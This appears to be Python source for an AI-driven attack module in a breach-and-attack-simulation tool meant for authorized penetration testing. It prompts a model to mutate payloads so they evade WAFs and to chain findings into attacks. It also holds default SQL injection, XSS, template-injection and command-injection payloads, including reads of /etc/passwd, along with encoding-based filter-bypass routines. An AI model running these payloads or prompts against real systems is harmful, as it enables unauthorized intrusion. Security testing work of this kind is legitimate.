"""
Zero-Day Attack Simulator.

Uses AI to generate novel attack payloads by:
1. Analyzing target technology stack and responses
2. Mutating known payloads using AI understanding of vulnerability classes
3. Chaining multiple low-severity findings into high-impact attack paths
4. Fuzzing with AI-guided input generation
5. Testing for logic flaws through behavioral analysis

This is what makes BAS Engine groundbreaking: it doesn't just replay known payloads,
it THINKS about the target and creates new attacks.

MITRE ATT&CK: T1190 - Exploit Public-Facing Application (novel vectors)
"""

from __future__ import annotations

import json
import logging
import random
import uuid
from typing import Any

from bas.ai.model_manager import ModelManager
from bas.core.executor import AttackExecutor, AttackRequest, AttackResponse
from bas.core.scope import AuthorizationLevel, ScopeEnforcer
from bas.core.engine import EngineEvent
from bas.modules.base_module import BaseAttackModule, ModuleMetadata, ModuleResult, VulnStatus

logger = logging.getLogger(__name__)

MUTATION_SYSTEM_PROMPT = """You are a security research AI specializing in novel exploit development for authorized penetration testing. Your task is to generate creative payload mutations that bypass common security filters.

Given a set of known payloads and information about the target's defenses, generate novel variations that:
1. Use encoding tricks the WAF might not handle
2. Exploit parser differentials between the WAF and the backend
3. Use polyglot payloads that work across multiple contexts
4. Chain multiple seemingly-benign inputs into exploitation
5. Exploit edge cases in input validation logic

Output ONLY valid payloads, one per line. No explanations."""

CHAIN_DISCOVERY_PROMPT = """You are analyzing security test results to identify potential attack chains - sequences of vulnerabilities that, when combined, create a more severe impact than any individual finding.

Given these findings from a BAS engagement:
{findings}

Target technology stack: {tech_stack}

Identify attack chains where:
1. An information disclosure enables a more targeted attack
2. A low-severity finding can be escalated through another finding
3. Multiple findings combine for authentication bypass or RCE
4. SSRF can be chained with internal service exploitation
5. XSS can be chained with CSRF for account takeover

For each chain, provide the specific sequence of steps an attacker would take.

Respond as JSON:
{{
    "chains": [
        {{
            "name": "<attack chain name>",
            "steps": [
                {{"action": "<step description>", "finding_id": "<related finding>", "technique": "<technique used>"}}
            ],
            "impact": "<resulting impact>",
            "severity": "critical|high|medium",
            "prerequisites": ["<what's needed>"]
        }}
    ]
}}"""

FUZZ_GENERATION_PROMPT = """Generate {count} novel fuzzing inputs for the following context:

Target: {target}
Parameter: {parameter}
Technology: {technology}
Current filter behavior: {filter_info}
Known blocked payloads: {blocked}
Known allowed payloads: {allowed}

Generate payloads that:
1. Test boundary conditions the filter might miss
2. Use alternative encodings (unicode, hex, octal, base64)
3. Exploit parser differentials
4. Use null bytes, overlong encodings, and charset tricks
5. Combine techniques in unexpected ways

Output one payload per line, no explanations."""


class ZeroDaySimulator(BaseAttackModule):
    """
    AI-driven zero-day simulation engine.

    Goes beyond known payloads by using AI to:
    - Mutate existing payloads to bypass defenses
    - Discover attack chains from multiple findings
    - Generate targeted fuzz inputs based on observed behavior
    - Identify logic flaws through behavioral analysis
    """

    def __init__(self, model_manager: ModelManager, payload_db: Any = None, ai_analyzer: Any = None):
        super().__init__(payload_db=payload_db, ai_analyzer=ai_analyzer)
        self._model = model_manager
        self._observation_log: list[dict[str, Any]] = []

    @property
    def metadata(self) -> ModuleMetadata:
        return ModuleMetadata(
            name="zeroday",
            description="AI-driven zero-day simulation - mutation, fuzzing, chain discovery",
            category="zeroday",
            mitre_technique_ids=["T1190", "T1203"],
            mitre_technique_names=["Exploit Public-Facing Application", "Exploitation for Client Execution"],
            auth_level_required=AuthorizationLevel.STANDARD,
            owasp_category="Multiple",
            cwe_ids=["CWE-20"],
            tags=["zeroday", "ai", "mutation", "fuzzing", "advanced"],
        )

    async def _get_payloads(self, target: str, options: dict[str, Any]) -> list[str]:
        """Generate novel payloads using AI mutation."""
        vuln_type = options.get("vuln_type", "sqli")
        base_payloads = options.get("base_payloads", [])

        # Get base payloads from DB if not provided
        if not base_payloads and self._payload_db:
            base_payloads = await self._payload_db.get_payloads(vuln_type, limit=20)

        if not base_payloads:
            base_payloads = self._get_default_base_payloads(vuln_type)

        # AI mutation
        mutated = await self._mutate_payloads(
            base_payloads=base_payloads,
            vuln_type=vuln_type,
            target_info=options.get("target_info", {}),
            filter_info=options.get("filter_info", "Unknown WAF/filter"),
        )

        # AI fuzzing
        fuzzed = await self._generate_fuzz_inputs(
            target=target,
            vuln_type=vuln_type,
            options=options,
        )

        # Combine: base + mutated + fuzzed
        all_payloads = base_payloads[:10] + mutated + fuzzed
        # Deduplicate while preserving order
        seen = set()
        unique = []
        for p in all_payloads:
            if p not in seen:
                seen.add(p)
                unique.append(p)

        return unique

    def _build_requests(self, target: str, payloads: list[str], options: dict[str, Any]) -> list[AttackRequest]:
        requests = []
        inject_params = options.get("params", ["q", "input", "data", "search"])
        path = options.get("path", "/")

        for payload in payloads:
            for param in inject_params:
                req_id = str(uuid.uuid4())[:8]
                requests.append(AttackRequest(
                    request_id=f"0day-{req_id}",
                    target=target,
                    method=options.get("method", "GET"),
                    path=path,
                    params={param: payload},
                    headers={"X-BAS-Payload-Hash": str(hash(payload))},
                ))

        return requests

    def _analyze_response(self, request: AttackRequest, response: AttackResponse, payload: str) -> ModuleResult:
        """Analyze response - record observations for adaptive fuzzing."""
        # Log observation for AI learning
        self._observation_log.append({
            "payload": payload,
            "status_code": response.status_code,
            "body_length": len(response.body),
            "elapsed_ms": response.elapsed_ms,
            "blocked": response.status_code in (403, 406, 429) or "blocked" in response.body_text.lower(),
            "error": response.status_code >= 500,
        })

        # Use same analysis as specific modules but flag as AI-generated
        body = response.body_text.lower()

        # Generic vulnerability indicators
        vuln_indicators = [
            (r"sql syntax", "sqli", "high"),
            (r"you have an error", "sqli", "high"),
            (r"<script", "xss", "high"),
            (r"uid=\d", "cmdi", "critical"),
            (r"root:x:0", "cmdi", "critical"),
            (r"49", "ssti", "critical"),   # 7*7
            (r"7777777", "ssti", "critical"),  # 7*'7'
        ]

        for indicator, vuln_type, severity in vuln_indicators:
            if indicator in body:
                return ModuleResult(
                    module_name="zeroday",
                    target=request.target,
                    status=VulnStatus.VULNERABLE,
                    payload_used=payload,
                    response_code=response.status_code,
                    response_body_preview=response.body_text[:500],
                    elapsed_ms=response.elapsed_ms,
                    evidence=f"AI-generated payload triggered {vuln_type}: '{indicator}' in response",
                    severity=severity,
                    mitre_technique_id="T1190",
                    detail={"detection_type": "ai_mutation", "vuln_type": vuln_type, "novel": True},
                )

        # Anomaly detection: unexpected response patterns
        if response.elapsed_ms > 5000 and "sleep" not in payload.lower():
            return ModuleResult(
                module_name="zeroday",
                target=request.target,
                status=VulnStatus.POTENTIALLY_VULNERABLE,
                payload_used=payload,
                response_code=response.status_code,
                elapsed_ms=response.elapsed_ms,
                evidence=f"Anomalous response time: {response.elapsed_ms:.0f}ms without time-based payload",
                severity="medium",
                mitre_technique_id="T1190",
                detail={"detection_type": "anomaly", "novel": True},
            )

        return ModuleResult(
            module_name="zeroday",
            target=request.target,
            status=VulnStatus.NOT_VULNERABLE,
            payload_used=payload,
            response_code=response.status_code,
            elapsed_ms=response.elapsed_ms,
        )

    async def _mutate_payloads(
        self,
        base_payloads: list[str],
        vuln_type: str,
        target_info: dict[str, Any],
        filter_info: str,
    ) -> list[str]:
        """Use AI to mutate known payloads into novel variants."""
        sample = base_payloads[:15]
        prompt = f"""Mutate these {vuln_type} payloads to bypass filters:

Known payloads:
{chr(10).join(sample)}

Target info: {json.dumps(target_info)}
Filter: {filter_info}

Generate 20 novel mutations. Use encoding tricks, parser differentials, polyglots, and edge cases."""

        try:
            response = await self._model.generate(
                prompt=prompt,
                system=MUTATION_SYSTEM_PROMPT,
                temperature=0.8,  # Higher temperature for creativity
            )
            payloads = [line.strip() for line in response.strip().split("\n") if line.strip() and not line.startswith("#")]
            logger.info(f"AI generated {len(payloads)} mutated payloads for {vuln_type}")
            return payloads
        except Exception as exc:
            logger.warning(f"AI mutation failed: {exc}")
            return self._algorithmic_mutations(base_payloads, vuln_type)

    async def _generate_fuzz_inputs(self, target: str, vuln_type: str, options: dict[str, Any]) -> list[str]:
        """Generate AI-guided fuzz inputs."""
        blocked = [obs["payload"] for obs in self._observation_log if obs.get("blocked")]
        allowed = [obs["payload"] for obs in self._observation_log if not obs.get("blocked") and not obs.get("error")]

        prompt = FUZZ_GENERATION_PROMPT.format(
            count=15,
            target=target,
            parameter=options.get("params", ["input"])[0],
            technology=options.get("technology", "Unknown"),
            filter_info=options.get("filter_info", "Unknown"),
            blocked=json.dumps(blocked[-10:]) if blocked else "None observed",
            allowed=json.dumps(allowed[-10:]) if allowed else "None observed",
        )

        try:
            response = await self._model.generate(
                prompt=prompt,
                system=MUTATION_SYSTEM_PROMPT,
                temperature=0.9,
            )
            payloads = [line.strip() for line in response.strip().split("\n") if line.strip() and not line.startswith("#")]
            return payloads
        except Exception:
            return []

    async def discover_attack_chains(self, findings: list[dict[str, Any]], tech_stack: dict[str, Any]) -> dict[str, Any]:
        """Use AI to discover attack chains from multiple findings."""
        prompt = CHAIN_DISCOVERY_PROMPT.format(
            findings=json.dumps(findings, indent=2),
            tech_stack=json.dumps(tech_stack, indent=2),
        )

        try:
            response = await self._model.generate(
                prompt=prompt,
                system="You are a security expert analyzing BAS results for attack chain identification.",
                temperature=0.4,
            )
            text = response.strip()
            if "```json" in text:
                text = text.split("```json", 1)[1].split("```", 1)[0]
            return json.loads(text.strip())
        except Exception as exc:
            logger.warning(f"Chain discovery failed: {exc}")
            return {"chains": []}

    def _algorithmic_mutations(self, base_payloads: list[str], vuln_type: str) -> list[str]:
        """Fallback: algorithmic payload mutations when AI is unavailable."""
        mutations = []
        encodings = {
            "double_url": lambda s: "".join(f"%25{ord(c):02x}" for c in s),
            "unicode": lambda s: "".join(f"\\u{ord(c):04x}" for c in s),
            "html_entity": lambda s: "".join(f"&#{ord(c)};" for c in s),
            "hex": lambda s: "".join(f"\\x{ord(c):02x}" for c in s),
            "case_swap": lambda s: "".join(c.upper() if random.random() > 0.5 else c.lower() for c in s),
            "null_insert": lambda s: "\x00".join(s),
            "tab_insert": lambda s: "\t".join(s.split(" ")),
            "comment_insert": lambda s: s.replace(" ", "/**/") if vuln_type == "sqli" else s,
        }

        for payload in base_payloads[:10]:
            for name, encode_fn in encodings.items():
                try:
                    mutated = encode_fn(payload)
                    if mutated != payload:
                        mutations.append(mutated)
                except Exception:
                    continue

        return mutations[:20]

    def _get_default_base_payloads(self, vuln_type: str) -> list[str]:
        """Get default base payloads for mutation."""
        defaults = {
            "sqli": ["' OR 1=1--", "1' UNION SELECT NULL--", "1 AND SLEEP(5)"],
            "xss": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "<svg onload=alert(1)>"],
            "cmdi": ["; id", "| cat /etc/passwd", "$(whoami)"],
            "ssti": ["{{7*7}}", "${7*7}", "<%= 7*7 %>"],
        }
        return defaults.get(vuln_type, defaults["sqli"])
